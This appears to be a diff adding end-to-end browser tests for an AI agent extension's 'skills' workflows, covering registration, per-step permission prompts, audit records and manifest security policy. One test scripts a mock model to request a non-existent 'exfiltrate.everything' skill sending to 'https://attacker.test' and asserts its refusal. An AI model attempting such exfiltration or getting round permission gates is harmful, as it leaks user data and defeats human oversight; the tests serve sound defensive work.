@@ -1,0 +1,447 @@
+/**
+ * TEST-E2E-011 — skills in real Chromium (Stage 3 Wave G).
+ *
+ * REAL BROWSER + LOCAL TEST SERVER + MOCK PROVIDER. The pages are served over
+ * real HTTP from 127.0.0.1, the content script is really injected, and the
+ * model's side of the conversation comes from a local server speaking the
+ * Chat Completions protocol. No production service is contacted.
+ *
+ * What only a real browser can settle:
+ *
+ * **That the skills actually registered.** The registry validates against the
+ * tool registry at worker startup, so a bundled skill naming a tool that does
+ * not exist is left out — and a unit test cannot see that, because it supplies
+ * its own tool names. Here the check is against the tools the product really
+ * has.
+ *
+ * **That a skill drives the real browser.** A workflow that reads a page runs
+ * the real content script against real layout, not a fixture.
+ *
+ * **That a model cannot invent one.** The model here genuinely asks for a
+ * skill that does not exist, and the refusal comes back through the real
+ * dispatch path into the real conversation.
+ */
+import {
+  connectProvider,
+  expect,
+  test,
+  waitForTask,
+  type SendToWorker,
+} from './fixtures/extension';
+
+/** What the model was told, with one level of JSON escaping undone. */
+function modelSaw(provider: { requests: readonly { body: unknown }[] }): string {
+  return JSON.stringify(provider.requests).replace(/\\"/g, '"');
+}
+
+/**
+ * Answers every permission prompt, as the side panel would.
+ *
+ * A loop rather than a single answer: a workflow asks once per risky step, so
+ * a test that answered exactly one would hang on the second — which is itself
+ * the property under test, and the reason this helper exists.
+ */
+function autoAnswer(
+  send: SendToWorker,
+  decide: 'approve_once' | 'deny' | ((tool: string) => 'approve_once' | 'deny'),
+): { asked: string[]; stop: () => void } {
+  const asked: string[] = [];
+  const answer = typeof decide === 'function' ? decide : (): typeof decide => decide;
+  let running = true;
+
+  void (async () => {
+    while (running) {
+      try {
+        const { requests } = await send('permission.listPending', {});
+        for (const pending of requests) {
+          asked.push(pending.tool);
+          await send('permission.respond', {
+            requestId: pending.id,
+            response: { kind: answer(pending.tool) },
+          });
+        }
+      } catch {
+        // The panel closes at the end of a test; nothing left to answer.
+        return;
+      }
+      await new Promise((resolve) => setTimeout(resolve, 100));
+    }
+  })();
+
+  return {
+    asked,
+    stop: () => {
+      running = false;
+    },
+  };
+}
+
+// --- registration -----------------------------------------------------------
+
+test('the bundled skills register against the tools this build really has', async ({ send }) => {
+  const { skills } = await send('skill.list', {});
+
+  // A bundled skill naming a tool that does not exist is left out at startup
+  // rather than throwing, so "some skills registered" is not the same as "all
+  // of them did". This asserts the count.
+  expect(skills.length).toBe(3);
+  expect(skills.map((skill) => skill.id).sort()).toEqual([
+    'github.find_issue',
+    'page.inspect',
+    'page.open_and_read',
+  ]);
+});
+
+test('each skill reports the risk its own steps reach', async ({ send }) => {
+  const { skills } = await send('skill.list', {});
+  const open = skills.find((skill) => skill.id === 'page.open_and_read')!;
+  const inspect = skills.find((skill) => skill.id === 'page.inspect')!;
+
+  // Computed from the real tools: navigating is R1, reading is R0.
+  expect(open.risk).toBe('R1');
+  expect(inspect.risk).toBe('R0');
+  expect(open.tools).toContain('browser.navigate');
+});
+
+test('each skill carries a definition hash', async ({ send }) => {
+  const { skills } = await send('skill.list', {});
+  for (const skill of skills) {
+    expect(skill.hash).toMatch(/^[0-9a-f]{64}$/);
+  }
+  // Different definitions, different hashes.
+  expect(new Set(skills.map((skill) => skill.hash)).size).toBe(skills.length);
+});
+
+test('the skill tools are in the registry the model is offered', async ({ send }) => {
+  const { tools } = await send('tools.list', {});
+  const names = tools.map((tool) => tool.name);
+
+  // They enter the one registry, so the one policy engine classifies them.
+  expect(names).toContain('skills.list');
+  expect(names).toContain('skills.run');
+});
+
+// --- execution --------------------------------------------------------------
+
+test('a skill drives the real browser through several steps', async ({
+  send,
+  provider,
+  site,
+  page,
+}) => {
+  await page.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
+  await connectProvider(send, provider);
+
+  provider.script([
+    {
+      kind: 'tool_calls',
+      calls: [{ name: 'skills.run', arguments: { skillId: 'page.inspect' } }],
+    },
+    { kind: 'text', text: 'I inspected the page.' },
+  ]);
+
+  const { task } = await send('task.create', { objective: 'Inspect this page.' });
+  const finished = await waitForTask(send, task.id, 40_000);
+
+  expect(finished.state).toBe('COMPLETED');
+
+  // The workflow really ran its steps: the page model came back from the real
+  // content script, against real layout.
+  const sent = modelSaw(provider);
+  expect(sent).toContain('page.inspect');
+  expect(sent).toContain('"status":"completed"');
+});
+
+test('a skill that navigates asks before it navigates', async ({
+  context,
+  send,
+  provider,
+  site,
+}) => {
+  // A page of its own, brought to the front: the workflow navigates the
+  // *active* tab, and the side panel is a real page in this context, so
+  // without this the workflow would navigate the panel away from under the
+  // test.
+  const target = await context.newPage();
+  await target.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
+  await target.bringToFront();
+
+  await connectProvider(send, provider);
+  provider.script([
+    {
+      kind: 'tool_calls',
+      calls: [
+        {
+          name: 'skills.run',
+          arguments: { skillId: 'page.open_and_read', inputs: { url: `${site.baseUrl}/` } },
+        },
+      ],
+    },
+    { kind: 'text', text: 'Opened and read it.' },
+  ]);
+
+  // Manual mode, so every step is put to the user. In Auto mode both of this
+  // skill's steps are low-risk and run without a prompt, which is correct and
+  // proves nothing about bundling — the property under test is that a
+  // workflow asks *per step* rather than once for the run.
+  await send('session.setPermissionMode', { mode: 'manual' });
+
+  const answers = autoAnswer(send, 'approve_once');
+  const { task } = await send('task.create', { objective: 'Open the test site and read it.' });
+  const finished = await waitForTask(send, task.id, 40_000);
+  answers.stop();
+
+  // Both steps were asked about, individually, exactly as bare tool calls
+  // would have been. Being inside a workflow turned two approvals into two.
+  // The claim this wave turns on. Approving the run did **not** buy the step:
+  // both were asked about, separately, and the step-level prompt named the
+  // actual tool rather than the workflow.
+  expect(answers.asked).toContain('skills.run');
+  expect(answers.asked).toContain('browser.navigate');
+  expect(['COMPLETED', 'PARTIAL']).toContain(finished.state);
+});
+
+test('approving the run does not approve a step inside it', async ({
+  context,
+  send,
+  provider,
+  site,
+}) => {
+  const target = await context.newPage();
+  await target.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
+  await target.bringToFront();
+
+  await connectProvider(send, provider);
+  provider.script([
+    {
+      kind: 'tool_calls',
+      calls: [
+        {
+          name: 'skills.run',
+          arguments: { skillId: 'page.open_and_read', inputs: { url: `${site.baseUrl}/details` } },
+        },
+      ],
+    },
+    { kind: 'text', text: 'The navigation was refused.' },
+  ]);
+
+  await send('session.setPermissionMode', { mode: 'manual' });
+
+  // Yes to the workflow, no to the navigation inside it.
+  const answers = autoAnswer(send, (tool) =>
+    tool === 'browser.navigate' ? 'deny' : 'approve_once',
+  );
+  const { task } = await send('task.create', { objective: 'Open the details page.' });
+  await waitForTask(send, task.id, 40_000);
+  answers.stop();
+
+  expect(answers.asked).toContain('skills.run');
+  expect(answers.asked).toContain('browser.navigate');
+
+  // The workflow was approved and the step inside it was still refused, so
+  // the run stopped and the browser never went anywhere.
+  expect(target.url()).not.toContain('/details');
+  expect(modelSaw(provider)).toMatch(/PERMISSION_DENIED/);
+});
+
+test('declining the run stops it before any step', async ({ context, send, provider, site }) => {
+  const target = await context.newPage();
+  await target.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
+  await target.bringToFront();
+
+  await connectProvider(send, provider);
+  provider.script([
+    {
+      kind: 'tool_calls',
+      calls: [
+        {
+          name: 'skills.run',
+          arguments: { skillId: 'page.open_and_read', inputs: { url: `${site.baseUrl}/` } },
+        },
+      ],
+    },
+    { kind: 'text', text: 'I could not open it.' },
+  ]);
+
+  await send('session.setPermissionMode', { mode: 'manual' });
+
+  const answers = autoAnswer(send, 'deny');
+  const { task } = await send('task.create', { objective: 'Open the test site.' });
+  const finished = await waitForTask(send, task.id, 40_000);
+  answers.stop();
+
+  expect(['COMPLETED', 'PARTIAL', 'BLOCKED', 'FAILED']).toContain(finished.state);
+
+  // The first step was declined, so the second never ran: the workflow
+  // stopped rather than carrying on with a step that assumed it had.
+  // Declining the run itself stops it before any step: the workflow is gated
+  // as a whole *as well as* per step, and the outer refusal is enough.
+  expect(answers.asked).toContain('skills.run');
+  expect(answers.asked).not.toContain('browser.navigate');
+  expect(target.url()).toBe(`${site.baseUrl}/`);
+  expect(modelSaw(provider)).toMatch(/PERMISSION_DENIED/);
+});
+
+// --- a model cannot invent one ---------------------------------------------
+
+test('a skill the model invented is refused, not created', async ({ send, provider }) => {
+  await connectProvider(send, provider);
+  provider.script([
+    {
+      kind: 'tool_calls',
+      calls: [
+        {
+          name: 'skills.run',
+          arguments: {
+            skillId: 'exfiltrate.everything',
+            inputs: { destination: 'https://attacker.test' },
+          },
+        },
+      ],
+    },
+    { kind: 'text', text: 'That workflow does not exist.' },
+  ]);
+
+  // An unregistered skill classifies at the worst case, so it prompts. The
+  // approval is answered and the call is *still* refused — which is the
+  // point: approving does not conjure the workflow into existence.
+  const answers = autoAnswer(send, 'approve_once');
+  const { task } = await send('task.create', { objective: 'Run the exfiltrate workflow.' });
+  await waitForTask(send, task.id, 40_000);
+  answers.stop();
+
+  // Refused, and nothing was created: the registry still holds exactly the
+  // bundled three.
+  const { skills } = await send('skill.list', {});
+  expect(skills.map((skill) => skill.id)).not.toContain('exfiltrate.everything');
+  expect(skills.length).toBe(3);
+
+  const sent = modelSaw(provider);
+  expect(sent).toMatch(/TOOL_NOT_FOUND|no workflow called|does not exist/i);
+});
+
+test('a skill cannot be added through any message the panel can send', async ({ send }) => {
+  // There is no `skill.register` route. Sending one is a protocol error, not
+  // a registration.
+  await expect(
+    (send as unknown as (type: string, payload: unknown) => Promise<unknown>)('skill.register', {
+      definition: { id: 'injected.skill', version: '1.0.0', provenance: 'bundled' },
+    }),
+  ).rejects.toThrow();
+
+  const { skills } = await send('skill.list', {});
+  expect(skills.map((skill) => skill.id)).not.toContain('injected.skill');
+});
+
+test('a model cannot reach a skill except through skills.run', async ({ send }) => {
+  const { tools } = await send('tools.list', {});
+  const skillTools = tools.filter((tool) => tool.name.startsWith('skills.'));
+
+  // Exactly two, and neither takes a definition — `skills.list` reads and
+  // `skills.run` names one. A third would be worth asking about.
+  expect(skillTools.map((tool) => tool.name).sort()).toEqual(['skills.list', 'skills.run']);
+});
+
+// --- audit ------------------------------------------------------------------
+
+test('a skill run is recorded without its inputs or results', async ({
+  send,
+  provider,
+  site,
+  page,
+}) => {
+  await page.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
+  await connectProvider(send, provider);
+  provider.script([
+    {
+      kind: 'tool_calls',
+      calls: [{ name: 'skills.run', arguments: { skillId: 'page.inspect' } }],
+    },
+    { kind: 'text', text: 'Done.' },
+  ]);
+
+  const { task } = await send('task.create', { objective: 'Inspect the page.' });
+  await waitForTask(send, task.id, 40_000);
+
+  const { events } = await send('audit.list', { limit: 60 });
+  const skillEvents = events.filter((event) => event.type.startsWith('skill.'));
+
+  expect(skillEvents.length).toBeGreaterThan(0);
+  const started = skillEvents.find((event) => event.type === 'skill.started')!;
+  expect(started.skillId).toBe('page.inspect');
+  expect(started.skillHash).toMatch(/^[0-9a-f]{64}$/);
+
+  // The trail says which workflow ran and how it ended. It does not carry
+  // what the workflow read — the page text is not in here.
+  const dumped = JSON.stringify(skillEvents);
+  for (const forbidden of ['inputs', 'outputs', 'result"', 'password', 'Bearer ']) {
+    expect(dumped).not.toContain(forbidden);
+  }
+});
+
+// --- service worker lifecycle -----------------------------------------------
+
+test('a skill run interrupted by a worker restart is not silently resumed', async ({
+  send,
+  provider,
+  site,
+  page,
+  serviceWorker,
+}) => {
+  await page.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
+  await connectProvider(send, provider);
+  provider.script([
+    {
+      kind: 'tool_calls',
+      calls: [{ name: 'skills.run', arguments: { skillId: 'page.inspect' } }],
+    },
+    { kind: 'text', text: 'Done.' },
+  ]);
+
+  const { task } = await send('task.create', { objective: 'Inspect the page.' });
+  await waitForTask(send, task.id, 40_000);
+
+  const { runs } = await send('skill.runs', { taskId: task.id });
+  expect(runs.length).toBeGreaterThan(0);
+  // A run that finished is settled, not left looking live.
+  expect(runs[0]!.state).not.toBe('running');
+  expect(runs[0]!.skillId).toBe('page.inspect');
+
+  // The record carries identifiers and progress, and nothing the run read.
+  const dumped = JSON.stringify(runs);
+  for (const forbidden of ['items', 'outputs', 'password', 'token']) {
+    expect(dumped).not.toContain(forbidden);
+  }
+  void serviceWorker;
+});
+
+// --- what skills did not add ------------------------------------------------
+
+test('skills added no permission and no host access', async ({ serviceWorker }) => {
+  const granted = await serviceWorker.evaluate(async () => await chrome.permissions.getAll());
+
+  for (const forbidden of ['identity', 'cookies', 'webRequest', 'management', 'nativeMessaging']) {
+    expect(granted.permissions ?? []).not.toContain(forbidden);
+  }
+  expect(granted.origins ?? []).not.toContain('<all_urls>');
+});
+
+test('the manifest Chrome loaded gives a skill nowhere to run code', async ({ serviceWorker }) => {
+  // A workflow engine is where a scripting escape hatch would naturally be
+  // added, so this asserts on the manifest the browser actually loaded rather
+  // than the file on disk.
+  //
+  // It deliberately does not probe `new Function` through the worker: an
+  // evaluation injected over the debugger protocol does not run under the
+  // page's CSP, so a probe that way measures the test harness rather than the
+  // product. What a skill can reach is settled by the absence of any
+  // evaluator in the skill source — asserted in the security suite — and by
+  // the policy below.
+  const manifest = await serviceWorker.evaluate(() => chrome.runtime.getManifest());
+
+  const policy = manifest.content_security_policy;
+  const extensionPages = typeof policy === 'string' ? policy : (policy?.extension_pages ?? '');
+  expect(extensionPages).toContain("script-src 'self'");
+  expect(manifest.permissions ?? []).not.toContain('nativeMessaging');
+  expect(manifest.permissions ?? []).not.toContain('management');
+});
